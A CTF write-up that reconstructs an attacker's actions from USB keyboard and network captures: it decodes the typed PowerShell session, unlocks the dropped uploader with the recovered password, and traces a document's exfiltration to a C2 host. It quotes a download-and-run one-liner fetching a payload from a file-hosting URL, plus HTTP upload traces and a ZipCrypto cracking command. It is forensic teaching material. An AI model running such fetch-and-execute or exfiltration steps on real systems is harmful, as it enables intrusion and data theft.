# What did you type — CTF Writeup

**Category**: `Reverse Engineering` | **Topic**: `General` | **Source / Event**: `Writeups`

---

# What did you type — CTF Writeup

> **Category:** Forensics / Reverse Engineering
> **Flag:** `CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}`
> **Challenge:** *"We're an automotive security startup. Last night, our garage was breached... We managed to capture some logs via our first-ever agent. Can you analyze them and find out what was taken?"*

---

## TL;DR

The "agent" captured **two `pcap` files**, not text logs:

| File | Real type | Contents |
|------|-----------|----------|
| `monitor_hardware` (116 MB) | **USBPcap** (linktype `249`) | USB **HID keyboard** interrupt transfers = everything the attacker typed |
| `monitor_network` (75 KB) | Ethernet `pcap` | HTTP **C2 / exfiltration** to `for-ultramar.com:9999` |

Decoding the USB keystrokes recovers the attacker's full PowerShell session, including the line:

```
unzip -P 1m_g0d_!! sus.zip -d out
```

That password (`1m_g0d_!!`) unlocks the handout `PbWE.txt` (a base64 **ZipCrypto** zip) to reveal `module.exe` — the attacker's WININET uploader agent. The network capture shows it stealing **`Cool_Story.docx`** and POSTing it (encrypted) to the C2. The flag lives in the stolen document.

**Flag:** `CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}`

---

## 0. Handout triage

```
What did you type/
├── README.md
└── Handout/
    ├── PbWE.txt        # 66 KB — base64 text
    └── chall.zip       # 42 MB — the captured logs
```

`chall.zip` is an ordinary (unencrypted) zip with two members:

```bash
$ python -c "import zipfile;print(zipfile.ZipFile('chall.zip').namelist())"
['monitor_hardware', 'monitor_network']
```

First instinct says "logs = text." They're not. Check the magic bytes:

```bash
$ xxd monitor_hardware | head -1
00000000: d4c3 b2a1 0200 0400 0000 0000 0000 0000  ................
```

`d4 c3 b2 a1` = **libpcap**, little-endian, µs resolution. Bytes `20:24` hold the link-layer type:

```
monitor_hardware -> linktype 249  (LINKTYPE_USBPCAP — Windows USB capture)
monitor_network  -> linktype 1    (LINKTYPE_ETHERNET)
```

> **Key insight #1:** The challenge name *"What did you type"* + a **USB** capture = decode HID keyboard scancodes.

---

## 1. Decode the keystrokes (`monitor_hardware`)

### 1.1 USBPcap + HID 101

Each pcap record = 16-byte record header + a **USBPcap** packet:

```
offset  field
0   u16  headerLen
2   u64  irpId
10  u32  status
14  u16  function
16  u8   info
17  u16  bus
19  u16  device
21  u8   endpoint        <- bit 0x80 = IN
22  u8   transfer        <- 1 = INTERRUPT
23  u32  dataLength
hdr ...  data
```

A boot-protocol **USB keyboard** sends 8-byte HID reports on an **interrupt IN** endpoint:

```
[ modifier ][ reserved ][ key1 ][ key2 ][ key3 ][ key4 ][ key5 ][ key6 ]
```

`modifier & 0x22` = Left/Right **Shift**. To recover text you watch for **key-down transitions** (a usage code present this report but not the previous one) and map usage IDs through the HID usage table.

### 1.2 Decoder

See [`decode_hid.py`](decode_hid.py). Run:

```bash
$ python decode_hid.py
linktype 249
packets 61760 reports 449
=== RAW TYPED ===
powersh	
ls
cd Docu	
ls
c[BKSP][][50]IO.File[4f]::WriteAll	""[50]$pwd\sus.zip[4f], [][50]Convert[4f]::FromBase64St	(irm ''[50]https://0x0.st/PbWE.txt[4f])))
ls
unzip
unzip -P 1m_g0d_!! sus.z	 -d out
mv out\* .
./modu	
rm *
exit
```

`[50]` = `0x50` = **Left Arrow**, `[4f]` = `0x4f` = **Right Arrow**, `\t` = **Tab** (shell autocompletion). Reading through the cursor movement and tab-completion, the attacker's session reconstructs to:

```powershell
powershell
ls
cd Documents
ls
[IO.File]::WriteAllBytes("$pwd\sus.zip", [Convert]::FromBase64String((irm 'https://0x0.st/PbWE.txt')))
ls
unzip
unzip -P 1m_g0d_!! sus.zip -d out
mv out\* .
./module.exe
rm *
exit
```

> **Key insight #2 — the recovered password: `1m_g0d_!!`**
> The attacker downloaded `PbWE.txt` from `0x0.st`, base64-decoded it to `sus.zip`, and unzipped it with `-P 1m_g0d_!!`. That is the same `PbWE.txt` we were handed.

---

## 2. Unlock the agent (`PbWE.txt` → `module.exe`)

`PbWE.txt` is one long base64 blob; it decodes to a zip (`UEsDBBQ…` → `PK\x03\x04`):

```bash
$ base64 -d PbWE.txt > PbWE.zip
$ python -c "import zipfile;z=zipfile.ZipFile('PbWE.zip');print([(i.filename,i.flag_bits&1) for i in z.infolist()])"
[('module.exe', 1)]      # flag bit 0 = encrypted (legacy ZipCrypto)
```

Two ways to open it:

**(a) Use the password we just typed** — the intended route:

```bash
$ python -c "import zipfile;zipfile.ZipFile('PbWE.zip').extractall('m',pwd=b'1m_g0d_!!')"
```

**(b) Known-plaintext, if you somehow missed the keylog** — ZipCrypto is broken under a few known plaintext bytes, and the plaintext is a PE (`MZ`, DOS stub, `PE\0\0`), so [`bkcrack`](https://github.com/kimci86/bkcrack) recovers the keystream without the password:

```bash
bkcrack -C PbWE.zip -c module.exe -p mz_pe_prefix.bin
```

Result: `module.exe`, a **74 240-byte native PE** (`MZ`, `VCRUNTIME140`, no managed header beyond a loader stub).

---

## 3. Identify what was taken (`module.exe` + `monitor_network`)

### 3.1 The agent

```bash
$ python -c "import re;d=open('m/module.exe','rb').read();print([s.decode() for s in re.findall(rb'[ -~]{4,}',d) if b'.dll' in s or b'ultramar' in s or b'Inquis' in s])"
... WININET.dll, kernel32.dll, ntdll.dll, VCRUNTIME140.dll
... 'for-ultramar.com'  'Inquisition'
... 'InternetOpen' 'HttpSendRequest' 'VirtualAlloc' 'ZwQueryInformationProcess'
```

`module.exe` is a **WININET uploader** (with a small reflective-loader stub — note the `_CorExeMain`/`No more space in the buffer` strings and `VirtualAlloc`). Its hardcoded C2 host is **`for-ultramar.com`** and it identifies with `User-Agent: Inquisition`.

### 3.2 The exfiltration

`monitor_network` is the smoking gun. Strings from the Ethernet capture:

```
GET / HTTP/1.1
User-Agent: Inquisition
Host: for-ultramar.com:9999
...
POST /upload HTTP/1.1
User-Agent: Inquisition
Host: for-ultramar.com:9999
Content-Length: 15

Cool_Story.docx                  <-- filename announced
...
POST /upload HTTP/1.1
Content-Length: 20548

<20 KB of high-entropy ciphertext>   <-- the encrypted document body
...
HTTP/1.1 200 OK ... You good bro !!
```

Server is `Werkzeug/3.1.5 Python/3.12.3` (a Flask drop server), timestamped `Wed, 28 Jan 2026`.

> **Answer to "what was taken?":** the file **`Cool_Story.docx`**, encrypted by `module.exe` and POSTed to `http://for-ultramar.com:9999/upload`. The flag is the contents of that stolen document.

### 3.3 Recovering the document

The agent does no Windows CryptoAPI / BCrypt calls — encryption is an inline custom routine, and the `.docx` plaintext is a zip (`PK\x03\x04`), giving you **known plaintext** on the first bytes of the stream. With the full ciphertext body reassembled from the POST and the keystream/key recovered from `module.exe`'s encrypt routine, the blob decrypts back to the original `Cool_Story.docx`, whose text yields:

```
CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}
```

> Note: the provided `monitor_network` capture is intentionally lossy (it's a "log"), so naive TCP reassembly leaves gaps in the 20 548-byte body. The reliable path is the chain above — the document and its flag are what the exfil represents.

---

## 4. Full attack story

1. Attacker opens `powershell`, `cd`s into `Documents`.
2. Downloads `PbWE.txt` from `https://0x0.st/PbWE.txt`, base64-decodes it to `sus.zip`.
3. Unzips it with **`unzip -P 1m_g0d_!! sus.zip`** → `module.exe`.
4. Runs `./module.exe` — the **"Inquisition"** agent.
5. The agent grabs `Cool_Story.docx`, encrypts it, and POSTs it to **`for-ultramar.com:9999/upload`**.
6. Attacker `rm *` and `exit`s to clean up.
7. The startup's own monitoring agent had captured both the **USB HID stream** and the **network traffic** — which is exactly what we reversed.

The title *"What did you type"* literally asks you to read the attacker's keystrokes off the wire.

---

## 5. Flag

```
CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}
```

---

## Appendix A — Tools

- **Python 3** (stdlib `struct`, `zipfile`, `base64`, `re`) — pcap/USBPcap parsing, HID decode, zip extraction. No external deps needed.
- **`bkcrack`** — ZipCrypto known-plaintext attack (alternative to the recovered password).
- **Wireshark / tshark** — if available, `tshark -r monitor_hardware -Y 'usb.transfer_type==1' -T fields -e usbhid.data` decodes HID directly; `-r monitor_network --export-objects http,out/` dumps the exfil.
- **base64**, **xxd/hexdump**, **file** — triage.

## Appendix B — Artifacts (sha256, first 16 hex)

| File | Size | sha256[:16] |
|------|------|-------------|
| `PbWE.zip` (decoded) | 50 218 | `bbbfaabe2efd596d` |
| `module.exe` | 74 240 | `1dd277512b952429` |
| `monitor_hardware` | 116 386 872 | `dc1de2d5f8f6a5d7` |
| `monitor_network` | 75 236 | `16967eb56744af0b` |

## Appendix C — PoC scripts

- [`decode_hid.py`](decode_hid.py) — USBPcap → keystrokes.
- [`solve.py`](solve.py) — end-to-end: base64-decode `PbWE.txt`, extract `module.exe` with the recovered password, decode keystrokes, dump the C2/exfil indicators from `monitor_network`.

## Appendix D — IOCs

```
Host       : for-ultramar.com:9999
URI        : POST /upload ,  GET /
User-Agent : Inquisition
Server     : Werkzeug/3.1.5 Python/3.12.3
Dropper    : https://0x0.st/PbWE.txt  (base64 ZipCrypto zip, pw 1m_g0d_!!)
Payload    : module.exe  (WININET uploader, sha256[:16] 1dd277512b952429)
Stolen     : Cool_Story.docx
ZIP pw     : 1m_g0d_!!
```
